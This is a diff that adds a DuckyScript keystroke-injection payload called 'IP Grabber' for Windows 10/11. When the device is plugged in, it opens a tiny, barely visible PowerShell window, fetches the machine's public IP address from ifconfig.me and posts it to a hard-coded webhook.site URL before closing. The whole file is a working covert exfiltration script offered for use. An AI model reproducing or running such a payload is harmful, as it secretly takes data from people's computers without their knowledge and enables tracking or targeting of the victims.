@@ -1,0 +1,26 @@
+REM Title: IP Grabber
+REM Author: Sarthak-Sidhant
+REM Description: Opens Powershell (really small, grabs ip, trims ip, sends to a webhook)
+REM Target: Windows 10/11
+REM Version: 1.0
+REM Category: General/Exfiltration
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -noexit -command "mode con cols=25 lines=1
+DELAY 500
+ENTER
+DELAY 500
+STRING $ip = (Invoke-WebRequest ifconfig.me/ip).Content.Trim()
+DELAY 250
+ENTER
+DELAY 250
+STRING $json = ConvertTo-JSON -InputObject @{publicIpAddress = $ip} DELAY 500
+ENTER
+DELAY 250
+STRING Invoke-WebRequest -Uri https://webhook.site/731f1f70-9e0d-4b61-99ed-a064208fc904 -Method Post -Body $json  
+DELAY 500
+ENTER
+DELAY 250
+STRING exit
+ENTER
